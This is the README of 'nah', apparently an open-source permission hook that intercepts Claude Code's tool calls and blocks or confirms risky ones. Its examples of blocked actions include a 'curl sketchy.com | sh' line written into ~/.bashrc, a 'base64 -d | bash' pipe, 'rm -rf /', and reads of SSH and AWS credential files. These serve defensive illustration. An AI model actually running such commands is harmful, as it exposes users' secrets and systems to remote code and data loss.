<p align="center">
  <img src="assets/logo.png" alt="nah" width="280">
</p>

<p align="center">
  <strong>A permission system you control.</strong><br>
  Because allow-or-deny isn't enough.
</p>

<p align="center">
  <a href="https://manuelschipper.github.io/nah">Docs</a> &bull;
  <a href="#install">Install</a> &bull;
  <a href="#what-it-guards">What it guards</a> &bull;
  <a href="#how-it-works">How it works</a> &bull;
  <a href="#configure">Configure</a> &bull;
  <a href="#cli">CLI</a>
</p>

---

## The problem

`git push` — Sure.<br>
`git push --force` — **nah?**

`rm -rf __pycache__` — Ok, cleaning up.<br>
`rm ~/.bashrc` — **nah.**

**Read** `./src/app.py` — Go ahead.<br>
**Read** `~/.ssh/id_rsa` — **nah.**

**Write** `./config.yaml` — Fine.<br>
**Write** `~/.bashrc` with `curl sketchy.com | sh` — **nah.**

`nah` classifies every tool call by what it actually does using contextual rules that run in milliseconds. For the ambiguous stuff, optionally route to an LLM. Every decision is logged and inspectable. Works out of the box, configure it how you want it.

## Install

```bash
pip install nah
nah install
```

You are up and running. To uninstall: `nah uninstall && pip uninstall nah`.

> **Don't use `--dangerously-skip-permissions`.** In bypass mode, hooks
> [fire asynchronously](https://github.com/anthropics/claude-code/issues/20946) —
> commands execute before nah can block them.
>
> Allow-list `Bash`, `Read`, `Glob`, `Grep` and let nah guard them.
> For `Write` and `Edit`, your call — nah inspects content either way.

## What it guards

nah is a [PreToolUse hook](https://docs.anthropic.com/en/docs/claude-code/hooks) that intercepts **every** tool call before it executes:

| Tool | What nah checks |
|------|----------------|
| **Bash** | Structural command classification — action type, pipe composition, shell unwrapping |
| **Read** | Sensitive path detection (`~/.ssh`, `~/.aws`, `.env`, ...) |
| **Write** | Path check + project boundary + content inspection (secrets, exfiltration, destructive payloads) |
| **Edit** | Path check + project boundary + content inspection on the replacement string |
| **Glob** | Guards directory scanning of sensitive locations |
| **Grep** | Catches credential search patterns outside the project |
| **MCP tools** | Generic classification for third-party tool servers (`mcp__*`) |

## How it works

Every tool call hits a deterministic structural classifier first, no LLMs involved.

```
Claude: Edit → ~/.claude/hooks/nah_guard.py
  nah. Edit targets hook directory: ~/.claude/hooks/ (self-modification blocked)

Claude: Read → ~/.aws/credentials
  nah? Read targets sensitive path: ~/.aws (requires confirmation)

Claude: Bash → npm test
  ✓ allowed (package_run)

Claude: Write → config.py containing "-----BEGIN PRIVATE KEY-----"
  nah? Write content inspection [secret]: private key
```

**`nah.`** = blocked. **`nah?`** = asks for your confirmation. Everything else flows through silently.

### Context-aware

The same command gets different decisions based on context:

| Command | Context | Decision |
|---------|---------|----------|
| `rm dist/bundle.js` | Inside project | Allow |
| `rm ~/.bashrc` | Outside project | Ask |
| `git push --force` | History rewrite | Ask |
| `base64 -d \| bash` | Decode + exec pipe | Block |

### Optional LLM layer

For commands the classifier can't resolve, nah can optionally consult an LLM:

```
Tool call → nah (deterministic) → LLM (optional) → Claude Code permissions → execute
```

The deterministic layer always runs first — the LLM only resolves leftover "ask" decisions. If no LLM is configured or available, the decision stays "ask" and the user is prompted.

Supported providers: Ollama, OpenRouter, OpenAI, Anthropic, Snowflake Cortex.

## Configure

Works out of the box with zero config. When you want to tune it:

```yaml
# ~/.config/nah/config.yaml  (global)
# .nah.yaml                  (per-project, can only tighten)

# Override default policies for action types
actions:
  filesystem_delete: ask         # always confirm deletes
  git_history_rewrite: block     # never allow force push
  lang_exec: allow               # trust inline scripts

# Guard sensitive directories
sensitive_paths:
  ~/.kube: ask
  ~/Documents/taxes: block

# Teach nah about your commands
classify:
  database_destructive:
    - "psql -c DROP"
    - "mysql -e DROP"
```

nah classifies commands by **action type**, not by command name. Run `nah types` to see all 20 built-in action types with their default policies.

### Action types

Every command maps to an action type, and every action type has a default policy:

| Policy | Meaning | Example types |
|--------|---------|---------------|
| `allow` | Always permit | `filesystem_read`, `git_safe`, `package_run` |
| `context` | Check path/project context, then decide | `filesystem_write`, `filesystem_delete`, `network_outbound` |
| `ask` | Always prompt the user | `git_history_rewrite`, `lang_exec`, `process_signal` |
| `block` | Always reject | `obfuscated` |

### Taxonomy profiles

Choose how much built-in classification to start with:

```yaml
# ~/.config/nah/config.yaml
profile: full      # full | minimal | none
```

- **full** (default) — comprehensive coverage across shell, git, packages, containers, and more
- **minimal** — curated essentials only (rm, git, curl, kill, ...)
- **none** — blank slate — make your own

### LLM configuration

```yaml
# ~/.config/nah/config.yaml
llm:
  enabled: true
  max_decision: ask              # cap: LLM can't escalate past "ask"
  providers: [openrouter]        # cascade order
  openrouter:
    url: https://openrouter.ai/api/v1/chat/completions
    key_env: OPENROUTER_API_KEY
    model: google/gemini-3.1-flash-lite-preview
```

### Supply-chain safety

Project `.nah.yaml` can **add** classifications and **tighten** policies, but can never relax them. A malicious repo can't use `.nah.yaml` to allowlist dangerous commands — only your global config has that power.

## CLI

### Core

```bash
nah install                # install hook
nah uninstall              # clean removal
nah update                 # update hook after pip upgrade
nah config show            # show effective merged config
nah config path            # show config file locations
```

### Test & inspect

```bash
nah test "rm -rf /"              # dry-run Bash classification
nah test --tool Read ~/.ssh/id_rsa   # test any tool, not just Bash
nah test --tool Write ./out.txt      # test Write with content inspection
nah types                        # list all action types with default policies
nah log                          # show recent hook decisions
nah log --blocks                 # show only blocked decisions
nah log --asks                   # show only ask decisions
nah log --tool Bash -n 20        # filter by tool, limit entries
nah log --json                   # machine-readable output
/nah-demo                        # live security demo inside Claude Code
```

### Manage rules

Adjust policies from the command line — no need to edit YAML:

```bash
nah allow filesystem_delete      # allow an action type
nah deny network_outbound        # block an action type
nah classify "docker rm" container_destructive  # teach nah a command
nah trust api.example.com        # trust a network host
nah allow-path ~/sensitive/dir   # exempt a path for this project
nah status                       # show all custom rules
nah forget filesystem_delete     # remove a rule
```

## How it's different

**vs. deny lists** ([safety-net](https://github.com/kenryu42/claude-code-safety-net), [destructive_command_guard](https://github.com/Dicklesworthstone/destructive_command_guard)) — Pattern matching on command strings is trivially bypassed. nah resolves paths, inspects content, guards all 6 tools + MCP, and classifies by action type instead of command name.

**vs. OS sandboxes** ([nono](https://github.com/always-further/nono)) — Complementary layers. Sandboxes enforce at the OS level but can't distinguish safe from unsafe operations on allowed paths.

**vs. built-in permissions** — Not configurable enough. You can't say "allow deletes inside my project but ask outside."

## License

[MIT](LICENSE)

---

<p align="center">
  <code>--dangerously-skip-permissions?</code><br><br>
  <img src="assets/logo_hammock.png" alt="nah" width="280">
</p>